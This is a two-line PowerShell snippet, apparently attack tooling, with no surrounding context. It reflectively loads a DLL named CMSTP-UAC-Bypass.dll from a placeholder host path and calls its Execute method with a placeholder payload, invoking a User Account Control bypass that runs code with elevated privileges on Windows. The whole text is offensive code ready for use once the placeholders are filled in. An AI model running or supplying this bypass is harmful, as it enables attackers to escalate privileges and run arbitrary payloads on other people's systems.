[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("IPOFHOST\CMSTP-UAC-Bypass.dll"))
[CMSTPBypass]::Execute("payloadhere")
